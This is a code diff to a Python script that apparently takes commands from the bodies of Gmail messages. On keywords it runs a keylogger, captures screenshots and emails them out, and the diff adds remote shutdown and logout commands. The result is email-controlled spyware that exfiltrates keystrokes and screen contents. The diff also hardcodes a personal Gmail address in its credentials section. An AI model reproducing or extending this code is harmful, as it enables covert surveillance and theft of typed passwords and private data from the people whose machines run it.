@@ -6,6 +6,7 @@ import time
 import keyLog
 import sendMail
 import re
+import powerController
 
 # Gmail account credentials
 username = "tnmhoang.lop93@gmail.com"
@@ -67,7 +68,7 @@ end = len(body)  # Define the end position in the string
 
 if body.find("KeyLog", start, end) != -1:
     # Set the duration in seconds (e.g., 60 seconds)
-    duration = 60
+    duration = 15
 
     # Record the start time
     start_time = time.time()
@@ -84,6 +85,11 @@ if body.find("ListApp", start, end) != -1:
 
 if body.find("Screenshot", start, end) != -1:
     sendMail.send_screenshot_email(sender_email)
-    
-if body.find("ListProcess", start, end) != -1:
-    sendMail.send_bgProcess_email(sender_email)
+
+if body.find("Shut Down", start, end) != -1:
+    power_controller = powerController.powerController()
+    power_controller.shutdown()
+
+if body.find("Log out", start, end) != -1:
+    power_controller = powerController.powerController()
+    power_controller.logout()
